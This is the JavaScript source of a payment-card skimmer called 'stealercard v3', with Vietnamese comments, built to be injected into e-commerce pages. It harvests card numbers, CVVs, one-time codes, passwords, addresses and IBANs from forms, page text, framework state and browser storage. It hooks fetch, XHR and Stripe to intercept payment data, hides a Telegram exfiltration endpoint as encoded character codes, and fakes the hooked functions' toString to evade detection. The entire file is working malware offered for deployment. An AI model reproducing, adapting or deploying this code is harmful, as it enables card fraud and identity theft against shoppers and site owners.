/*!
 * stealercard v3 — multi-site · DOM harvest · stealth · Telegram
 * Sửa 3 dòng: CFG.token, CFG.chats (hoặc CFG.relay). Chèn bằng <script src="..."> hoặc inline.
 */
(function () {
  'use strict';

  /* ==================== 1. CONFIG ==================== */
  var CFG = {
    token: 'Token',        // bỏ trống nếu dùng relay
    chats: ['ENTER'],        // group: '-1001234567890'
    relay: '',                       // vd: 'https://co.abc.workers.dev' (token nằm ở Worker)
    title: 'SofiaxAnhKhoa',
    gap: 1100,                       // ms giữa 2 tin (chống 429)
    maxLen: 3500,                    // < 4096 của Telegram
    hooks: true,                     // hook fetch / xhr / stripe
    onLoad: 'auto',                  // 'auto' | true | false
    debug: false
  };

  /* ==================== 2. UTILS ==================== */
  var _ael = EventTarget.prototype.addEventListener;
  function on(t, ev, fn, cap) { try { _ael.call(t, ev, fn, !!cap); } catch (e) {} }
  function S() { return String.fromCharCode.apply(null, [].slice.call(arguments)); }
  var HOST   = S(104,116,116,112,115,58,47,47,97,112,105,46,116,101,108,101,103,114,97,109,46,111,114,103);
  var P_BOT  = S(47,98,111,116);
  var P_SEND = S(47,115,101,110,100,77,101,115,115,97,103,101);

  var DOMSEEN = {};   // chống lặp value+label trong session
  var pageSent = {};  // giá trị đã gửi cho URL hiện tại (reset khi đổi trang)

  function log() { if (CFG.debug) try { console.log.apply(console, ['[sc]'].concat([].slice.call(arguments))); } catch (e) {} }
  function esc(s) { return String(s == null ? '' : s).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;'); }
  function cut(s, n) { s = String(s == null ? '' : s).replace(/\s+/g, ' ').trim(); return s.length > n ? s.slice(0, n) + '\u2026' : s; }
  function norm(s) { return String(s || '').toLowerCase().replace(/[^a-z0-9]/g, ''); }
  function key(v) { return String(v).toLowerCase().replace(/[^a-z0-9@.+]/g, '').slice(0, 90); }
  function stamp() {
    var d = new Date(), p = function (x) { return (x < 10 ? '0' : '') + x; };
    return p(d.getUTCDate()) + '/' + p(d.getUTCMonth() + 1) + ' ' + p(d.getUTCHours()) + ':' + p(d.getUTCMinutes()) + 'Z';
  }
  var SKIP = /^(form_key|uenc|_token|_csrf|csrf|csrftoken|_csrf_token|authenticity_token|__RequestVerificationToken|g-recaptcha-response.*|recaptcha.*|h-captcha-response|cf-turnstile-response|to|return_url|redirect|redirect_url|submit|submitbutton|wp-submit)$/i;

  /* ==================== 3. NHẬN DIỆN FIELD ==================== */
  var RULES = [
    [/^(ccnumber|cardnumber|cardno|cardnum|ccnum|ccno|creditcardnumber|debitcardnumber|pan|card|creditcard|debitcard|numerokarty|numerocarta)$/, 'Card number'],
    [/^(ccexp|ccexpiry|ccexpdate|ccexpmonth|ccexpyear|exp|expiry|expdate|expiration|expirationdate|expmonth|expyear|ccmonth|ccyear|mmyy|mm|yy|validade|scadenza)$/, 'Expiry'],
    [/^(cvv|cvc|cid|cvv2|cvc2|cccsc|cccvv|cccid|ccsecuritycode|cvvcode|cvcnumber|securitycode|csc|codice|cardcode)$/, 'CVV'],
    [/^(ccname|cardname|cardholder|cardholdername|nameoncard|titolare|ccfirstname|cclastname|cardfirstname|cardlastname)$/, 'Cardholder'],
    [/^(email|emailaddress|mail|billingemail|customeremail|buyeremail|eposta)$/, 'Email'],
    [/^(firstname|fname|givenname|nombre|nome|vorname|billingfirstname|prenom|forename)$/, 'First name'],
    [/^(lastname|lname|surname|familyname|apellido|cognome|nachname|billinglastname|nom)$/, 'Last name'],
    [/^(telephone|phone|phonenumber|tel|mobile|cellphone|telefono|telefone|billingtelephone|billingphone|gsm)$/, 'Phone'],
    [/^(street|streetaddress|address|address1|addressline1|billingaddress|shippingaddress|indirizzo|adresse|billingstreet|billingstreet0|billingaddress1)$/, 'Address'],
    [/^(address2|addressline2|street2|billingaddress2|billingstreet1)$/, 'Address 2'],
    [/^(city|town|ciudad|citta|stadt|billingcity|locality|suburb|addresslevel2)$/, 'City'],
    [/^(postcode|zip|zipcode|postalcode|postal|cap|plz|billingzip|billingpostcode|cep)$/, 'Postcode'],
    [/^(state|province|region|county|billingstate|addresslevel1|estado|regione|bundesland)$/, 'State'],
    [/^(country|countryid|countrycode|countryname|nation|billingcountry|billingcountryid|pais|paese|land)$/, 'Country'],
    [/^(username|user|login|account|userlogin|customerlogin)$/, 'Username'],
    [/^(password|pass|pwd|passwd|accountpassword)$/, 'Password'],
    [/^(grandtotal|ordertotal|total|amount|price|subtotal|orderamount|totalprice)$/, 'Total'],
    [/^(otp|onetimecode|code2fa|token2fa|verificationcode|authcode|smscode|otpcode|twocode)$/, 'OTP'],
    [/^(name|fullname|fullname2)$/, 'Full name']
  ];

  function labelText(el) {
    try {
      if (el.id && window.CSS && CSS.escape) {
        var l = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
        if (l && l.textContent) return l.textContent;
      }
      var p = el.closest && el.closest('label');
      if (p && p.textContent) return p.textContent;
    } catch (e) {}
    return '';
  }

  function labelOf(el) {
    var g = function (a) { try { return el.getAttribute(a) || ''; } catch (e) { return ''; } };
    var cands = [g('autocomplete'), g('name'), g('id'), g('data-name'), g('data-field'),
                 g('data-testid'), g('placeholder'), g('aria-label'), labelText(el)];
    for (var i = 0; i < cands.length; i++) {
      var n = norm(cands[i]);
      if (!n) continue;
      for (var j = 0; j < RULES.length; j++) if (RULES[j][0].test(n)) return RULES[j][1];
    }
    var v = String(el.value || '').replace(/[\s\-]/g, '');
    if (/^\d{13,19}$/.test(v) && luhn(v)) return 'Card number';
    if (/^\d{3,4}$/.test(v) && /cvv|cvc|cid|sec|code/i.test(cands.join(' '))) return 'CVV';
    if (/^\d{2}\/?\d{2,4}$/.test(v)) return 'Expiry';
    var raw = (g('name') || g('id') || g('placeholder') || g('aria-label') || '').replace(/[\[\]_\-\.]+/g, ' ').trim();
    return raw ? raw.replace(/\b\w/g, function (c) { return c.toUpperCase(); }) : 'Field';
  }

  function luhn(d) {
    var s = 0, alt = false;
    for (var i = d.length - 1; i >= 0; i--) {
      var n = +d[i];
      if (alt) { n *= 2; if (n > 9) n -= 9; }
      s += n; alt = !alt;
    }
    return d.length >= 12 && s % 10 === 0;
  }
  function findCard(txt) {
    var m = String(txt).match(/\d[\d\s\-]{11,25}\d/g) || [];
    for (var i = 0; i < m.length; i++) {
      var d = m[i].replace(/\D/g, '');
      if (d.length >= 13 && d.length <= 19 && luhn(d)) return d;
    }
    return null;
  }
  function brand(d) {
    if (/^4/.test(d)) return 'Visa';
    if (/^(5[1-5]|2[2-7])/.test(d)) return 'MasterCard';
    if (/^3[47]/.test(d)) return 'Amex';
    if (/^6(?:011|5)/.test(d)) return 'Discover';
    if (/^35/.test(d)) return 'JCB';
    if (/^3(?:0[0-5]|[68])/.test(d)) return 'Diners';
    if (/^(50|5[6-9]|6[2-9])/.test(d)) return 'Maestro';
    if (/^62/.test(d)) return 'UnionPay';
    return 'unknown';
  }
  function binInfo(d) { return ' [' + brand(d) + ' BIN ' + d.slice(0, 8) + ']'; }

  /* ==================== 4. THU THẬP TỪ FORM ==================== */
  function collectEls(root) {
    var out = [], i, els;
    root = root || document;
    try {
      els = root.querySelectorAll('input,select,textarea');
      for (i = 0; i < els.length; i++) out.push(els[i]);
    } catch (e) {}
    try {
      var hosts = root.querySelectorAll('*');
      for (i = 0; i < hosts.length; i++) {
        if (hosts[i].shadowRoot) out = out.concat(collectEls(hosts[i].shadowRoot));
      }
    } catch (e) {}
    if (root === document) {
      try {
        var fr = root.querySelectorAll('iframe');
        for (i = 0; i < fr.length; i++) {
          try { if (fr[i].contentDocument) out = out.concat(collectEls(fr[i].contentDocument)); } catch (e) {}
        }
      } catch (e) {}
    }
    return out;
  }

  function describe(el) {
    if (!el || !el.tagName) return null;
    var tag = el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select' && tag !== 'textarea') return null;
    var type = (el.type || '').toLowerCase();
    if (/^(submit|button|reset|image|file|range|color)$/.test(type)) return null;
    if (el.disabled) return null;
    if (SKIP.test(el.name || '') || SKIP.test(el.id || '')) return null;
    if ((type === 'checkbox' || type === 'radio') && !el.checked) return null;
    var v;
    if (tag === 'select' && el.multiple && el.selectedOptions) {
      v = Array.prototype.map.call(el.selectedOptions, function (o) { return o.value; }).join(', ');
    } else if (type === 'checkbox' || type === 'radio') {
      v = (el.value && el.value !== 'on') ? el.value : '\u2713';
    } else {
      v = el.value == null ? '' : String(el.value);
    }
    v = v.replace(/[\r\n\t]+/g, ' ').replace(/\s{2,}/g, ' ').trim();
    if (!v) return null;
    return { k: labelOf(el), v: v };
  }

  function readFields(root) {
    var els = (root && root.tagName && /^(input|select|textarea)$/i.test(root.tagName))
      ? [root] : collectEls(root || document);
    var out = [], seen = {}, i, f, k, n, base;
    for (i = 0; i < els.length; i++) {
      f = describe(els[i]);
      if (!f) continue;
      base = k = f.k; n = 0;
      while (seen[k]) { n++; k = base + ' (' + n + ')'; }
      seen[k] = 1;
      out.push([k, f.v]);
    }
    return out;
  }

  /* ==================== 5. GỬI TELEGRAM ==================== */
  var lastSig = {}, Q = [], busy = false;

  function sig(pairs) {
    var s = '', i;
    for (i = 0; i < pairs.length; i++) s += pairs[i][0] + '\u0001' + pairs[i][1] + '\u0002';
    return s;
  }
  function build(tag, pairs) {
    var L = ['<b>' + esc(CFG.title) + '</b> \u2014 ' + esc(tag) + '  <i>' + stamp() + '</i>',
             '<code>' + esc(cut(location.href, 210)) + '</code>', ''];
    for (var i = 0; i < pairs.length; i++) L.push(esc(pairs[i][0]) + ': <b>' + esc(cut(pairs[i][1], 180)) + '</b>');
    return L.join('\n');
  }
  function chunk(text, n) {
    if (text.length <= n) return [text];
    var lines = text.split('\n'), out = [], cur = '';
    for (var i = 0; i < lines.length; i++) {
      if (cur && (cur + '\n' + lines[i]).length > n) { out.push(cur); cur = lines[i]; }
      else cur = cur ? cur + '\n' + lines[i] : lines[i];
    }
    if (cur) out.push(cur);
    return out;
  }
  function markSent(pairs) {
    for (var i = 0; i < pairs.length; i++) pageSent[key(pairs[i][1])] = 1;
  }
  function emit(tag, pairs, sk) {
    if (!pairs || !pairs.length) return;
    sk = sk || tag;
    var s = sig(pairs);
    if (lastSig[sk] === s) return;
    lastSig[sk] = s;
    markSent(pairs);
    var parts = chunk(build(tag, pairs), CFG.maxLen), i;
    for (i = 0; i < parts.length; i++) Q.push(parts[i]);
    drain(false);
  }
  function capture(tag, root) { emit(tag, readFields(root), tag); }

  function endp() { return CFG.relay || (HOST + P_BOT + CFG.token + P_SEND); }

  function lanes(url, body, urgent) {
    var byFetch = function (ok, bad) {
      try {
        fetch(url, { method: 'POST', mode: 'no-cors', keepalive: true,
          headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: body })
          .then(ok, bad);
      } catch (e) { bad(); }
    };
    var byBeacon = function (ok, bad) {
      try {
        if (navigator.sendBeacon &&
            navigator.sendBeacon(url, new Blob([body], { type: 'application/x-www-form-urlencoded' }))) ok();
        else bad();
      } catch (e) { bad(); }
    };
    var byImg = function (ok, bad) {
      if (CFG.relay || body.length > 1600) { bad(); return; }
      try { var im = new Image(); im.onload = ok; im.onerror = bad; im.src = url + '?' + body; } catch (e) { bad(); }
    };
    return urgent ? [byBeacon, byFetch, byImg] : [byFetch, byBeacon, byImg];
  }

  function post(text, ci, done, urgent) {
    var chat = CFG.chats[ci];
    if (chat === undefined) { done(); return; }
    var url = endp();
    var body = 'chat_id=' + encodeURIComponent(chat) +
               '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(text);
    var L = lanes(url, body, urgent), i = 0;
    (function next() {
      if (i >= L.length) { post(text, ci + 1, done, urgent); return; }
      L[i++](function () { done(); }, next);
    })();
  }
  function drain(urgent) {
    if (busy || !Q.length) return;
    busy = true;
    var t = Q.shift();
    post(t, 0, function () {
      busy = false;
      if (Q.length) setTimeout(function () { drain(false); }, CFG.gap);
    }, urgent);
  }

  /* ==================== 6. HOOK NETWORK ==================== */
  function formToStr(fd) {
    var o = [];
    try { fd.forEach(function (v, k) { o.push(k + '=' + (typeof v === 'string' ? v : '[file]')); }); } catch (e) {}
    return o.join('&');
  }
  function sniff(txt, tag) {
    try {
      var t = String(txt || '');
      if (!t || t.length > 200000) return;
      var card = findCard(t);
      if (!card && !/stripe/i.test(tag)) return;
      var pairs = [['Source', tag]];
      if (card) pairs.push(['Card (raw)', card + binInfo(card)]);
      pairs.push(['Payload', cut(t, 900)]);
      emit('PAYLOAD', pairs, 'PAY:' + tag + ':' + (card || t.length));
    } catch (e) {}
  }

  if (CFG.hooks) {
    (function () {
      var F = window.fetch;
      if (typeof F !== 'function') return;
      var W = function (a, b) {
        try {
          var u = (typeof a === 'string') ? a : ((a && a.url) || '');
          var bd = b && b.body;
          if (typeof bd === 'string') sniff(bd, 'fetch ' + cut(u, 60));
          else if (bd instanceof FormData) sniff(formToStr(bd), 'fetch ' + cut(u, 60));
          else if (bd instanceof URLSearchParams) sniff(bd.toString(), 'fetch ' + cut(u, 60));
        } catch (e) {}
        return F.apply(this, arguments);
      };
      try { W.toString = function () { return F.toString(); }; } catch (e) {}
      try { window.fetch = W; } catch (e) {}
    })();

    (function () {
      var P = window.XMLHttpRequest && XMLHttpRequest.prototype;
      if (!P) return;
      var O = P.open, Sd = P.send;
      P.open = function () { try { this.__u = arguments[1]; } catch (e) {} return O.apply(this, arguments); };
      P.send = function (b) {
        try {
          var u = 'xhr ' + cut((this && this.__u) || '', 60);
          if (typeof b === 'string') sniff(b, u);
          else if (b instanceof FormData) sniff(formToStr(b), u);
          else if (b && /URLSearchParams/.test(Object.prototype.toString.call(b))) sniff(b.toString(), u);
        } catch (e) {}
        return Sd.apply(this, arguments);
      };
      try {
        P.open.toString = function () { return O.toString(); };
        P.send.toString = function () { return Sd.toString(); };
      } catch (e) {}
    })();

    (function () {
      var n = 0, iv = setInterval(function () {
        try {
          var St = window.Stripe;
          if (typeof St === 'function' && !St.__h) {
            var W = function () {
              var o = St.apply(this, arguments);
              ['createToken', 'createPaymentMethod', 'confirmCardPayment', 'confirmPayment', 'confirmSetupIntent']
                .forEach(function (m) {
                  var f = o && o[m];
                  if (typeof f !== 'function' || f.__h) return;
                  var G = function () {
                    try {
                      var a1 = arguments[1] || {};
                      var det = a1.payment_method || a1.billing_details || a1;
                      if (det && typeof det === 'object') sniff(JSON.stringify(det), 'stripe ' + m);
                      if (a1.card && typeof a1.card === 'object' && a1.card.number) sniff(JSON.stringify(a1.card), 'stripe card');
                    } catch (e) {}
                    return f.apply(this, arguments);
                  };
                  try { G.__h = 1; } catch (e) {}
                  o[m] = G;
                });
              return o;
            };
            try { W.prototype = St.prototype; W.__h = 1; window.Stripe = W; } catch (e) {}
          }
          if (++n > 160 || (window.Stripe && window.Stripe.__h)) clearInterval(iv);
        } catch (e) { clearInterval(iv); }
      }, 500);
    })();
  }

  /* ==================== 7. DOM HARVEST ==================== */
  function add(out, k, v, max) {
    if (out.length >= 90) return;
    var s = String(v == null ? '' : v).replace(/\s+/g, ' ').trim();
    if (!s || s.length < 2 || s.length > (max || 300)) return;
    k = String(k).slice(0, 42);
    var id = k + '=' + key(s);
    if (DOMSEEN[id]) return;
    DOMSEEN[id] = 1;
    out.push([k, s]);
  }

  var _blob = '', _blobT = 0;
  function blob() {
    var t = Date.now();
    if (_blob && t - _blobT < 2500) return _blob;
    var b = document.body;
    _blob = b ? String(b.innerText || b.textContent || '') : '';
    if (_blob.length > 250000) _blob = _blob.slice(0, 250000);
    _blobT = t;
    return _blob;
  }

  /* ---- 7.1 text có nhãn ---- */
  var LABELS = [
    [/(?:billing|shipping|delivery|invoice)\s*(?:address|details)?\s*[:\-]/, 'Address (page)'],
    [/(?:phone|telephone|tel\.?|mobile|di\s*đ?ộng|điện\s*thoại|tel[eé]fono|telefono)\s*(?:number|no\.?)?\s*[:\-]/, 'Phone (page)'],
    [/(?:e-?mail|correo|thư\s*điện\s*tử)\s*[:\-]/, 'Email (page)'],
    [/(?:postal\s*code|post\s*code|zip(?:\s*code)?|postcode|mã\s*bưu\s*chính|\bcap\b|\bplz\b)\s*[:\-]/, 'Postcode (page)'],
    [/(?:country|quốc\s*gia|\bpaese\b|\bland\b|\bpays\b)\s*[:\-]/, 'Country (page)'],
    [/(?:city|town|thành\s*phố|ciudad|citt[aà])\s*[:\-]/, 'City (page)'],
    [/(?:state|province|region|county)\s*[:\-]/, 'State (page)'],
    [/(?:full\s*name|card\s*holder|cardholder|name\s*on\s*card|tên\s*chủ\s*thẻ|họ\s*(?:và)?\s*tên)\s*[:\-]/, 'Name on card (page)'],
    [/(?:customer|account\s*holder|khách\s*hàng|bill\s*to|ship\s*to)\s*[:\-]/, 'Customer (page)'],
    [/(?:order|invoice|transaction|reference|mã\s*đơn)\s*(?:number|no\.?|id|#)?\s*[:#\-]/, 'Order (page)'],
    [/(?:grand\s*total|order\s*total|total|amount|tổng\s*cộng|importe)\s*[:\-]/, 'Total (page)'],
    [/(?:card\s*number|kart\s*nummer|numer\s*karty|numero\s*carta)\s*[:\-]/, 'Card (page)'],
    [/(?:exp(?:iry|ires)?|valid\s*thru|scadenza|hết\s*hạn)\s*[:\-]/, 'Expiry (page)'],
    [/(?:iban|account\s*number|số\s*tài\s*khoản|sort\s*code)\s*[:\-]/, 'Bank (page)'],
    [/(?:date\s*of\s*birth|ngày\s*sinh|\bdob\b)\s*[:\-]/, 'DOB (page)'],
    [/(?:vat|tax\s*id|mã\s*số\s*thuế)\s*[:\-]/, 'Tax ID (page)']
  ];

  function isLabelLine(s) {
    for (var i = 0; i < LABELS.length; i++) if (LABELS[i][0].test(s)) return true;
    return false;
  }

  function harvestText(out) {
    var t = blob();
    if (!t) return;
    var L = t.split(/\n+/), i, j, m, line, rest, buf, x, n;
    for (i = 0; i < L.length && i < 6000; i++) {
      line = L[i].replace(/[ \t\u00a0]+/g, ' ').trim();
      if (!line || line.length > 220) continue;
      for (j = 0; j < LABELS.length; j++) {
        m = line.match(LABELS[j][0]);
        if (!m) continue;
        rest = line.slice(m.index + m[0].length).replace(/^[\s\-–—]+/, '').trim();
        if (rest.length >= 3) { add(out, LABELS[j][1], rest, 220); break; }
        buf = [];
        for (x = i + 1; x < Math.min(i + 5, L.length); x++) {
          n = L[x].replace(/[ \t\u00a0]+/g, ' ').trim();
          if (!n) continue;
          if (isLabelLine(n) || n.length > 120) break;
          buf.push(n);
          if (buf.length >= 3) break;
        }
        if (buf.length) add(out, LABELS[j][1], buf.join(' / '), 260);
        break;
      }
    }
  }

  /* ---- 7.2 pattern: thẻ, email, phone, IBAN ---- */
  var JUNK = /^(support|info|sales?|contact|admin|help|hello|noreply|no-reply|orders?|service|webmaster|billing)@|@(example|test|domain|sentry)\.|sentry|wixpress|\.(png|jpe?g|gif|svg|webp)$/i;

  function harvestPatterns(out) {
    var t = blob(), i, d, seen = {}, m;
    if (!t) return;

    m = t.match(/\d[\d\s\-]{11,25}\d/g) || [];
    for (i = 0; i < m.length && out.length < 90; i++) {
      d = m[i].replace(/\D/g, '');
      if (d.length >= 13 && d.length <= 19 && luhn(d) && !seen[d]) {
        seen[d] = 1;
        add(out, 'Card (page)', d + binInfo(d), 60);
      }
    }

    m = t.match(/(?:[\u2022\u25cf*xX]{3,4}[\s\-]?){3}\d{2,4}/g) || [];
    for (i = 0; i < m.length && i < 6; i++) add(out, 'Card (masked)', m[i].replace(/[\u2022\u25cf]/g, '*'), 40);

    m = t.match(/[a-z0-9._%+\-]+@[a-z0-9.\-]+\.[a-z]{2,10}/gi) || [];
    for (i = 0, seen = {}; i < m.length && out.length < 90; i++) {
      if (JUNK.test(m[i]) || seen[m[i].toLowerCase()]) continue;
      seen[m[i].toLowerCase()] = 1;
      add(out, 'Email (page)', m[i], 90);
    }

    m = t.match(/(?:\+|00)\d[\d\s().\-]{6,18}\d/g) || [];
    for (i = 0, seen = {}; i < m.length && out.length < 90; i++) {
      d = m[i].replace(/[^\d]/g, '');
      if (d.length < 9 || d.length > 15 || seen[d]) continue;
      if (luhn(d) && d.length >= 13) continue;
      seen[d] = 1;
      add(out, 'Phone (page)', m[i].trim(), 40);
    }

    m = t.match(/\b[A-Z]{2}\d{2}[A-Z0-9]{11,30}\b/g) || [];
    for (i = 0; i < m.length && i < 4; i++) add(out, 'IBAN (page)', m[i], 40);
  }

  /* ---- 7.3 microdata + element ngữ nghĩa ---- */
  var MICRO = {
    name: 'Name', givenName: 'First name', familyName: 'Last name', email: 'Email',
    telephone: 'Phone', streetAddress: 'Address', addressLine1: 'Address', postalCode: 'Postcode',
    addressLocality: 'City', addressRegion: 'State', addressCountry: 'Country', price: 'Total',
    orderNumber: 'Order', productID: 'Product', birthDate: 'DOB', taxID: 'Tax ID'
  };

  function harvestEls(out) {
    var i, els, el, t, p, v, a, A;
    try {
      els = document.querySelectorAll('[itemprop]');
      for (i = 0; i < els.length && i < 60; i++) {
        p = els[i].getAttribute('itemprop');
        if (!MICRO[p]) continue;
        v = els[i].getAttribute('content') || (els[i].innerText || '').replace(/\s+/g, ' ').trim();
        if (v) add(out, MICRO[p] + ' <micro>', v, 160);
      }
    } catch (e) {}

    var sel = '[data-email],[data-phone],[data-address],[data-customer],[data-testid],' +
              '[class*="email"],[id*="email"],[class*="phone"],[id*="phone"],' +
              '[class*="address"],[id*="address"],[class*="zip"],[class*="postal"],' +
              '[class*="country"],[class*="billing"],[class*="shipping"],[class*="customer"]';
    try { els = document.querySelectorAll(sel); } catch (e) { els = []; }
    for (i = 0; i < els.length && i < 120 && out.length < 90; i++) {
      el = els[i];
      try { if (el.querySelector('input,select,textarea')) continue; } catch (e) {}
      t = (el.innerText || el.textContent || '').replace(/\s+/g, ' ').trim();
      if (!t || t.length > 160) continue;
      var nm = el.getAttribute('data-testid') || el.id ||
               (typeof el.className === 'string' ? el.className : '') || el.tagName;
      add(out, 'DOM ' + cut(String(nm).replace(/[-_]+/g, ' '), 36), t, 160);
    }

    A = ['data-email', 'data-phone', 'data-address', 'data-customer', 'data-billing'];
    try {
      for (i = 0; i < A.length; i++) {
        els = document.querySelectorAll('[' + A[i] + ']');
        for (var j = 0; j < els.length && j < 6; j++) {
          v = els[j].getAttribute(A[i]);
          if (v) add(out, A[i].replace('data-', 'Attr '), v, 300);
        }
      }
    } catch (e) {}
    void a;
  }

  /* ---- 7.4 JSON-LD / state framework / data-* / storage ---- */
  var JKEY = /^(name|full_?name|first_?name|last_?name|given_?name|family_?name|surname|customer_?name|card_?holder|email|e_?mail|phone|telephone|tel|mobile|address|address1|address2|address_?line1|address_?line2|street|street_?address|city|town|state|province|region|zip|zip_?code|postal_?code|postcode|country|country_?code|country_?name|company|organization|order_?number|order_?id|invoice|invoice_?id|total|grand_?total|amount|currency|card_?number|cardNumber|pan|exp_?month|exp_?year|expiry|cvv|cvc|iban|dob|birth_?date|birthday|tax_?id|vat|vat_?number|gender|ssn|account_?number)$/i;

  function walk(o, out, depth) {
    if (!o || typeof o !== 'object' || depth > 6) return;
    var cnt = 0, k, v;
    for (k in o) {
      if (!Object.prototype.hasOwnProperty.call(o, k)) continue;
      if (++cnt > 400) break;
      try { v = o[k]; } catch (e) { continue; }
      if (v && typeof v === 'object') { walk(v, out, depth + 1); continue; }
      if (typeof v !== 'string' && typeof v !== 'number') continue;
      if (!JKEY.test(k)) continue;
      v = String(v).trim();
      if (!v || v.length < 2 || v.length > 300) continue;
      if (/^(true|false|null|undefined|0|1|-1)$/i.test(v)) continue;
      add(out, 'JSON ' + k, v, 220);
    }
  }

  function tryJSON(s, out, tag) {
    if (!s || s.length > 400000) return;
    var c = s.charAt(0);
    if (c !== '{' && c !== '[') { add(out, tag, s, 200); return; }
    try { walk(JSON.parse(s), out, 0); } catch (e) { add(out, tag, s, 200); }
  }

  function harvestJSON(out) {
    var i, sc, k, v;
    try {
      sc = document.querySelectorAll('script[type="application/ld+json"],script#__NEXT_DATA__,script[type="application/json"],script[id*="state"]');
      for (i = 0; i < sc.length && i < 8; i++) tryJSON(sc[i].textContent, out, 'ld+json');
    } catch (e) {}

    var G = ['__INITIAL_STATE__', '__PRELOADED_STATE__', '__APOLLO_STATE__', 'initialState',
             '__DATA__', 'checkoutData', 'customerData', 'orderData'];
    for (i = 0; i < G.length; i++) {
      try { if (window[G[i]] && typeof window[G[i]] === 'object') walk(window[G[i]], out, 0); } catch (e) {}
    }

    try {
      var d = document.querySelectorAll('[data-address],[data-customer],[data-checkout],[data-billing],[data-shipping],[data-json]');
      var A = ['data-address', 'data-customer', 'data-checkout', 'data-billing', 'data-shipping', 'data-json'];
      for (i = 0; i < d.length && i < 20; i++) {
        for (var a = 0; a < A.length; a++) {
          v = d[i].getAttribute && d[i].getAttribute(A[a]);
          if (v) tryJSON(v, out, A[a].replace('data-', 'data '));
        }
      }
    } catch (e) {}

    ['localStorage', 'sessionStorage'].forEach(function (st) {
      try {
        var S2 = window[st];
        if (!S2) return;
        for (var j = 0; j < S2.length && j < 60; j++) {
          k = S2.key(j);
          if (!/addr|email|phone|card|checkout|billing|ship|customer|order|user|payment|account|profile/i.test(k)) continue;
          v = S2.getItem(k) || '';
          if (v.length > 100000) continue;
          tryJSON(v, out, st + ':' + cut(k, 30));
        }
      } catch (e) {}
    });
  }

  function harvestMeta(out) {
    try { if (document.title) add(out, 'Title', document.title, 160); } catch (e) {}
    try {
      var ms = document.querySelectorAll('meta[property="og:title"],meta[property="og:description"],meta[property="product:price:amount"],meta[name="price"],meta[name="description"],meta[name="author"]');
      for (var i = 0; i < ms.length; i++) {
        var c = ms[i].getAttribute('content');
        if (c && c.length < 300) add(out, 'Meta ' + (ms[i].getAttribute('property') || ms[i].getAttribute('name')), c, 200);
      }
    } catch (e) {}
  }

  /* ---- 7.5 gộp form + DOM ---- */
  function harvestDom() {
    var out = [];
    try { harvestEls(out); } catch (e) {}
    try { harvestMeta(out); } catch (e) {}
    try { harvestJSON(out); } catch (e) {}
    try { harvestText(out); } catch (e) {}
    try { harvestPatterns(out); } catch (e) {}
    return out;
  }

  function captureFull(tag) {
    var pairs = readFields(document), dom = harvestDom(), have = {}, i, k;
    for (i = 0; i < pairs.length; i++) have[key(pairs[i][1])] = 1;
    for (i = 0; i < dom.length && pairs.length < 90; i++) {
      k = key(dom[i][1]);
      if (have[k] || pageSent[k]) continue;
      have[k] = 1;
      pairs.push(dom[i]);
    }
    if (pairs.length) emit('DOM', pairs, 'FULL:' + location.href);
    void tag;
  }

  /* ---- 7.6 SPA nav ---- */
  function afterNav() {
    if (afterNav.u === location.href) return;
    afterNav.u = location.href;
    pageSent = {};
    setTimeout(function () { captureFull('nav'); }, 900);
  }
  try {
    ['pushState', 'replaceState'].forEach(function (m) {
      var F = history[m];
      if (typeof F !== 'function') return;
      history[m] = function () { var r = F.apply(this, arguments); afterNav(); return r; };
    });
  } catch (e) {}
  on(window, 'popstate', afterNav);
  on(window, 'hashchange', afterNav);

  if (CFG.onLoad === true || (CFG.onLoad === 'auto' &&
      /checkout|pay|order|cart|3ds|acs|verify|secure|confirm|thank|success|capture/i.test(location.pathname + location.search + location.hash))) {
    setTimeout(function () { captureFull('load'); }, 1800);
  }

  /* ==================== 8. SỰ KIỆN ==================== */
  var HOT = /card|expiry|cvv|cvc|cid|otp|password|cardholder/i;

  on(document, 'submit', function (ev) {
    var f = ev.target;
    if (!f || !f.elements) return;
    capture('submit', f);
    Promise.resolve().then(function () { capture('submit', f); });
    setTimeout(function () { captureFull('page'); }, 600);
    setTimeout(function () { captureFull('page-late'); }, 3000);
    setTimeout(function () { captureFull('page-late2'); }, 8000);
  }, true);

  on(document, 'click', function (ev) {
    var t = ev.target;
    if (!t || !t.closest) return;
    var b = t.closest('button,[type="submit"],input[type="submit"],input[type="button"],a[role="button"],[class*="pay"],[class*="checkout"]');
    if (!b) return;
    var cls = typeof b.className === 'string' ? b.className : '';
    var s = (b.innerText || b.value || b.getAttribute('aria-label') || '') + ' ' + cls + ' ' + (b.id || '');
    if (!/pay|order|checkout|purchase|continue|next|submit|confirm|place|buy|thanh\s*toan|dat\s*hang|xac\s*nhan|hoan\s*tat|tiep\s*tuc/i.test(s)) return;
    setTimeout(function () {
      capture('button', (b.form || (b.closest && b.closest('form')) || document));
    }, 260);
    setTimeout(function () { captureFull('pre-pay'); }, 1200);
  }, true);

  on(document, 'change', function (ev) {
    var e = ev.target;
    if (!e || !e.tagName) return;
    setTimeout(function () { capture('change', e); }, 0);
  }, true);

  var deb = {};
  on(document, 'input', function (ev) {
    var e = ev.target;
    if (!e || !e.tagName) return;
    if (!HOT.test(labelOf(e))) return;
    var id = (e.name || e.id || '') + '|' + (e.type || '');
    clearTimeout(deb[id]);
    deb[id] = setTimeout(function () { capture('typed', e); }, 900);
  }, true);

  on(document, 'blur', function (ev) {
    var e = ev.target;
    if (!e || !e.tagName) return;
    if (!HOT.test(labelOf(e))) return;
    capture('blur', e);
  }, true);

  function flush() {
    var pairs = readFields(document), dom = harvestDom(), have = {}, i, k;
    for (i = 0; i < pairs.length; i++) have[key(pairs[i][1])] = 1;
    for (i = 0; i < dom.length; i++) {
      k = key(dom[i][1]);
      if (!have[k]) { have[k] = 1; pairs.push(dom[i]); }
    }
    if (!pairs.length) return;
    var s = sig(pairs);
    if (lastSig.flush === s) return;
    lastSig.flush = s;
    var parts = chunk(build('unload', pairs), CFG.maxLen);
    var url = endp(), j;
    for (j = 0; j < parts.length && j < 2; j++) {
      var body = 'chat_id=' + encodeURIComponent(CFG.chats[0] || '') +
                 '&parse_mode=HTML&disable_web_page_preview=true&text=' + encodeURIComponent(parts[j]);
      try {
        if (navigator.sendBeacon) navigator.sendBeacon(url, new Blob([body], { type: 'application/x-www-form-urlencoded' }));
      } catch (e) {}
    }
  }
  on(window, 'pagehide', flush);
